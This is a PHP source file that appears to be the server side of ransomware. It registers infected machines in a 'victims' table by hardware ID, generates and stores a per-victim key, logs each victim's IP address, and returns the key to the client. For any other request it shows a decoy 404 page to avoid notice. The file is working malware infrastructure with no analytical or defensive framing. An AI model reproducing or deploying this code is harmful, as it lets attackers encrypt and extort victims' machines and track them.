<?php
include('connect.php');
$functions = new functions();



if(isset($_GET['generate']) && isset($_GET['hwid'])) {
    $hwid = $functions->save($functions->save3($_GET['hwid']));
	$pcuser = $functions->save($functions->save3($_GET['generate']));
    $password = $functions->generateRandomString(15);
    $ip = $functions->get_client_ip();

    $sql= mysql_query("select * from $prefix.victims where hwid='$hwid'");	
    $row = mysql_fetch_assoc($sql);
    $total = mysql_num_rows($sql);
    if ($total == 0){
        $query = mysql_query("INSERT INTO $prefix.victims (`pcuser`, `password`, `hwid`, `created_at`, `last_ip`) VALUES ('$pcuser', '$password', '$hwid', NOW(), '$ip')");
        if($query){
            $sql= mysql_query("select * from $prefix.victims where hwid='$hwid'");	
            $row = mysql_fetch_assoc($sql);
            $vIdent = $row['hwid']; 
            $vKey = $row['password']; 
            echo $vKey.$split_stub.$vIdent; 
        }
    }else{
        $query = mysql_query("UPDATE $prefix.victims SET updated_at =NOW() , last_ip ='$ip' where hwid='$hwid'");  
        if($query){
            $sql= mysql_query("select * from $prefix.victims where hwid='$hwid'");	
            $row = mysql_fetch_assoc($sql);
            $vIdent = $row['hwid']; 
            $vKey = $row['password']; 
            echo $vKey.$split_stub.$vIdent; 
        }
    }
    
}else{
    echo '<b>404 Error</b><br/>Sorry, but this link is invalid.!';
    exit();
}
?>